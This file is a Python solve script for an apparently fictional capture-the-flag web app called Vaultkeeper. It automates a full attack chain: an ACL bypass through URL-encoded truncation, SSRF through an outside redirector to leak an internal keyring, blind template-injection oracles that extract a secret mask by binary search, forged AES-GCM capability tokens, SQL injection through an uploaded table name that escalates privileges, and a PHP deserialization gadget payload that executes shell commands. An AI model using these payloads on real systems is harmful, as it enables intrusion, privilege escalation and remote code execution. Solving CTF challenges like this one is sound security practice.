#!/usr/bin/env python3
"""
Vaultkeeper full chain, stages A to G.
    ctf-python solve.py --base http://host:port --redir https://public.tld
"""
import argparse
import base64
import hashlib
import hmac
import io
import json
import os
import re
import sys
import tarfile
import time

import requests
from Crypto.Cipher import AES

HERE = os.path.dirname(os.path.abspath(__file__))
ART = os.path.join(os.path.dirname(HERE), "artifacts")
os.makedirs(ART, exist_ok=True)

S = requests.Session()
S.headers["User-Agent"] = "vk-client/1.0"


def save(name, data):
    p = os.path.join(ART, name)
    mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
    with open(p, mode) as f:
        f.write(data)
    print("[+] saved %s" % p)


# ---------------------------------------------------------------- stage A ---
def bypass(base, script, query=""):
    """Return the URL for an ACL-restricted /api script via %3F truncation."""
    u = "%s/api/%s.php%%3Fa.php" % (base.rstrip("/"), script)
    if query:
        u += "?" + query
    return u


# ---------------------------------------------------------------- stage B ---
def ssrf_get(base, redir, target):
    """GET any internal URL and get its BODY back.

    fetch_source.php dumps the final response body in `trace` only when the
    status chain contains a code outside 200/204/301/302/303/307/308, and it
    sets follow_location=1 explicitly, which makes PHP's http wrapper follow a
    Location header on ANY status. So the redirector answers 418 + Location.
    """
    if "{URL}" in redir:
        # generic form, e.g. a public redirector:
        #   https://httpbin.org/redirect-to?url={URL}&status_code=309
        # 309 is a 3xx (so httpbin will emit it) that is NOT in fetch_source's
        # $STD list, which is what makes the chain "unusual".
        hop = redir.replace("{URL}", requests.utils.quote(target, safe=""))
    else:
        hop = redir.rstrip("/") + "/r/" + target
    url = bypass(base, "fetch_source", "url=" + requests.utils.quote(hop, safe=""))
    r = S.get(url, timeout=40)
    j = r.json()
    if "trace" not in j:
        raise SystemExit("[-] no trace in fetch_source reply: %s" % r.text[:400])
    return j["trace"]


def leak_keyring(base, redir):
    body = ssrf_get(base, redir, "http://127.0.0.1/api/keyring.php")
    save("keyring.json", body)
    kr = json.loads(body)
    if "cap_key_masked" not in kr and kr.get("unseal_ref"):
        # deployed build: keyring only hands out a handshake ref, the masked
        # key moved to the seal service named in `seal_service`
        svc = kr.get("seal_service", "/api/vault_unseal.php")
        body2 = ssrf_get(base, redir,
                         "http://127.0.0.1" + svc + "?ref=" + kr["unseal_ref"])
        save("vault_unseal.json", body2)
        kr.update(json.loads(body2))
    return kr


# ---------------------------------------------------------------- stage C ---
def render(base, tpl, event="maintenance.x"):
    r = S.post(base.rstrip("/") + "/api/render_template.php",
               json={"template": tpl, "event": event}, timeout=30)
    try:
        return r.status_code, r.json().get("rendered")
    except Exception:
        return r.status_code, None


def detect_engine(base):
    """Handout build uses {{ }} with a full expression grammar.

    The build deployed on 2026-09-05 uses [[ ]] with a filter pipeline
    (`[[path|filter:arg:arg]]`, arguments are raw strings) whose only filters
    are upper lower len trim slice sub at char mul add. It has no `/` and no
    `ord`, so the DivisionByZeroError oracle below does NOT exist there and
    --mask has to be supplied by other means.
    """
    if render(base, "{{node}}")[1] == "node-a":
        return "curly"
    if render(base, "[[node]]")[1] == "node-a":
        return "square"
    return "unknown"


def render_err(base, tpl, event="maintenance.x"):
    """True when the template evaluation threw (HTTP 500)."""
    r = S.post(base.rstrip("/") + "/api/render_template.php",
               json={"template": tpl, "event": event}, timeout=20)
    return r.status_code == 500


def render_span_echoed(base, tpl):
    """True when the [[...]] pipeline THREW.

    VkPipeline::render() wraps each span in try/catch and, on any Throwable,
    returns the span verbatim ("surface it verbatim for the author to fix").
    A protected value that evaluates cleanly renders '[redacted]'.  So the two
    outcomes are distinguishable without a status-code channel.
    """
    _, out = render(base, tpl)
    return out is not None and out.strip() == tpl.strip()


def leak_mask_bar(base):
    """Stage C on the current build: the `bar` filter is str_repeat().

    case 'bar': str_repeat((string)($a[0] ?? "█"), (int) $in->v)

    PHP 8 throws ValueError when $times < 0, and the per-span catch turns that
    into the verbatim span.  So

        [[config.cap_mask|at:I|code|sub:N|bar:.]]

    renders '[redacted]' when ord(mask[I]) >= N and echoes the span when
    ord(mask[I]) < N.  That's a clean per-character comparison oracle, and the
    protected flag never has to be dropped.
    """
    n = None
    for cand in range(1, 41):
        if render_span_echoed(base, "[[config.cap_mask|len|sub:%d|bar:.]]" % cand):
            n = cand - 1
            break
    if not n:
        raise SystemExit("[-] could not size cap.mask with the bar oracle")
    print("[*] cap.mask length %d" % n)
    out = ""
    for i in range(n):
        lo, hi = 32, 127          # invariant: lo <= ord(c) <= hi
        while lo < hi:
            mid = (lo + hi + 1) // 2
            tpl = "[[config.cap_mask|at:%d|code|sub:%d|bar:.]]" % (i, mid)
            if render_span_echoed(base, tpl):
                hi = mid - 1      # threw: ord < mid
            else:
                lo = mid          # ok:    ord >= mid
        out += chr(lo)
        print("[*] mask %2d/%d %r" % (i + 1, n, out))
    return out.encode()


def leak_mask(base):
    n = None
    for cand in range(1, 40):
        if render_err(base, "{{1/(strlen(config.cap_mask)-%d)}}" % cand):
            n = cand
            break
    if n is None:
        raise SystemExit("[-] could not size cap.mask")
    print("[*] cap.mask length %d" % n)
    out = ""
    for i in range(n):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            # the expression divides by zero exactly when ord(c) > mid
            if render_err(base,
                          "{{1/(int(ord(substr(config.cap_mask,%d,1))>%d)-1)}}"
                          % (i, mid)):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        print("[*] mask %2d/%d %r" % (i + 1, n, out))
    return out.encode()


# ---------------------------------------------------------------- stage D ---
def cap_issue(cap_key, scope):
    """Reimplementation of vk_cap_issue(): aes-128-gcm, b64(iv|ct|tag)."""
    rec = scope.ljust(16, " ")[:16].encode()
    iv = os.urandom(12)
    c = AES.new(cap_key, AES.MODE_GCM, nonce=iv, mac_len=16)
    ct, tag = c.encrypt_and_digest(rec)
    return base64.b64encode(iv + ct + tag).decode()


def seal_key(cap_key):
    return hmac.new(cap_key, b"vk-checkpoint-seal.v4", hashlib.sha256).digest()


def verify_cap_key(base, cap_key, cap_b64=None, expect=b"viewer          "):
    """Offline check: /api/status.php read_capability is vk_cap_issue('viewer').

    Decrypting it with a candidate cap key and getting a valid GCM tag plus the
    exact padded scope is proof the key is right. Used as the oracle for every
    mask hypothesis.
    """
    if cap_b64 is None:
        cap_b64 = S.get(base.rstrip("/") + "/api/status.php",
                        timeout=30).json()["read_capability"]
    raw = base64.b64decode(cap_b64)
    if len(cap_key) != 16 or len(raw) != 44:
        return False
    try:
        pt = AES.new(cap_key, AES.MODE_GCM, nonce=raw[:12],
                     mac_len=16).decrypt_and_verify(raw[12:28], raw[28:44])
    except Exception:
        return False
    return pt == expect


def vk_session_id(cap_key, sec, usec, seq=0):
    ss = hmac.new(cap_key, b"vk-restore-session.v2", hashlib.sha256).digest()
    msg = ("%d|%06d|%d" % (sec, usec, seq)).encode()
    return hmac.new(ss, msg, hashlib.sha256).hexdigest()[:24]


# ---------------------------------------------------------------- tar ------
def make_tar(members):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        for name, data in members.items():
            if isinstance(data, str):
                data = data.encode()
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            ti.mtime = int(time.time())
            t.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


# ---------------------------------------------------------------- stage F ---
def php_str(s):
    b = s.encode() if isinstance(s, str) else s
    return b's:%d:"%s";' % (len(b), b)


def ckpt_key(cap_key):
    """lib/recovery.php: hash_hmac('sha256','vk-resume-envelope.v2', cap_key, true)."""
    return hmac.new(cap_key, b"vk-resume-envelope.v2", hashlib.sha256).digest()


def frame_resume(cap_key, payload):
    """Current build wraps the state.dat unserialize in vk_resume_checkpoint():
        "VKR2" | HMAC-SHA256(payload, vk_ckpt_key())[32 raw] | payload
    """
    return b"VKR2" + hmac.new(ckpt_key(cap_key), payload, hashlib.sha256).digest() + payload


def build_state_dat(cap_key, command):
    spec = json.dumps({"stage": "system", "args": [command]}).encode()
    cursor = (b'O:14:"ManifestCursor":2:{'
              + php_str("fragments") + b"a:1:{i:0;" + php_str(spec) + b"}"
              + php_str(" ManifestCursor i") + b"i:0;}")
    frag = (b'O:11:"DocFragment":2:{'
            + php_str("loader") + b'O:13:"PartialLoader":0:{}'
            + php_str("cursor") + cursor + b"}")
    shard = b'O:10:"CacheShard":1:{' + php_str("reconcile") + frag + b"}"
    slot = "s"
    mac = hmac.new(seal_key(cap_key),
                   ("vk-checkpoint-seal.v5|%s|CacheShard" % slot).encode(),
                   hashlib.sha256).hexdigest()
    ctx = (b'O:13:"VkSealContext":3:{'
           + php_str("slot") + php_str(slot)
           + php_str("sink") + shard
           + php_str("mac") + php_str(mac) + b"}")
    return (b'O:12:"RestorePoint":3:{'
            + php_str("scope") + b'E:16:"VkScope:Operator";'
            + php_str("ctx") + ctx
            + php_str("snapshot") + php_str("x") + b"}")


# ---------------------------------------------------------------- driver ---
def sqli_table():
    # unique per run: the injected DROP only removes `vk_restore`.`<prefix>`,
    # so the real table with the nasty name survives and a fixed name would
    # collide on the second attempt.
    return "%s`;UPDATE vaultkeeper.jobs SET role='operator';#" % os.urandom(3).hex()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--redir", required=True,
                    help="public https origin running solve/redir.py")
    ap.add_argument("--cmd", default="cat /flag.txt")
    ap.add_argument("--mask", default=None,
                    help="cap.mask, when the renderer oracle is unavailable")
    ap.add_argument("--legacy-state", action="store_true",
                    help="emit a bare serialize() state.dat (pre-VKR2 build)")
    a = ap.parse_args()
    base = a.base.rstrip("/")

    # 0. create a restore job
    r = S.post(base + "/api/request_restore.php",
               json={"source_label": "vk-" + os.urandom(3).hex()}, timeout=20)
    job = r.json()
    print("[+] job", job.get("job_id"))

    # B. leak the keyring over the loopback-only endpoint
    kr = leak_keyring(base, a.redir)
    masked = base64.b64decode(kr["cap_key_masked"])
    print("[+] cap_key_masked", kr["cap_key_masked"])
    sessions = kr.get("restore_sessions", [])
    print("[+] restore sessions", sessions)

    # C+D. mask -> cap key
    if a.mask:
        mask = a.mask.encode()
    else:
        eng = detect_engine(base)
        print("[*] template engine:", eng)
        if eng == "curly":
            mask = leak_mask(base)          # old handout: DivisionByZeroError
        elif eng == "square":
            mask = leak_mask_bar(base)      # current build: str_repeat ValueError
        else:
            raise SystemExit("[-] unrecognised template engine; pass --mask")
    cap_key = bytes(x ^ y for x, y in zip(masked, mask))
    if not verify_cap_key(base, cap_key):
        print("[!] cap_key fails the AES-GCM check against read_capability")
    print("[+] cap_key %r" % cap_key)
    save("cap_key.txt", cap_key.decode("latin1"))

    sid = None
    for s in sessions:
        if int(s["id"]) == int(job["job_id"]):
            sid = s["session_id"]
    if sid is None and sessions:
        sid = sessions[0]["session_id"]
    if sid is None:
        raise SystemExit("[-] no restore session id; rerun (keyring lists the "
                         "8 most recent kind='restore' jobs)")
    print("[+] session id", sid)

    console = base + "/restore.php?job=" + sid

    # E. import a bundle whose table name injects into the DROP statement
    sql = "CREATE TABLE `%s` (x INT);" % sqli_table().replace("`", "``")
    bundle = make_tar({"database.sql": sql})
    S.post(console, data={"action": "upload_bundle"},
           files={"bundle": ("b.vkb", bundle)}, timeout=30)
    cap = cap_issue(cap_key, "maintainer")
    r = S.post(console, data={"action": "import_db", "cap": cap}, timeout=60)
    save("import_db.html", r.text)
    m = re.search(r'<div class="notice">(.*?)</div>', r.text, re.S)
    print("[+] import:", (m.group(1).strip() if m else r.status_code))

    # F. operator scope now: upload the deserialisation payload
    state = build_state_dat(cap_key, a.cmd)
    if not a.legacy_state:
        state = frame_resume(cap_key, state)
    save("state.dat", state)
    bundle = make_tar({"state.dat": state})
    S.post(console, data={"action": "upload_bundle"},
           files={"bundle": ("b.vkb", bundle)}, timeout=30)
    r = S.post(console, data={"action": "system_restore"}, timeout=60)
    save("system_restore.html", r.text)
    tail = r.text.split("</html>")[-1]
    print("[+] rce output:", repr(tail))
    for flag in re.findall(r"TFC\{[^}]*\}", r.text):
        print("[FLAG]", flag)


if __name__ == "__main__":
    main()
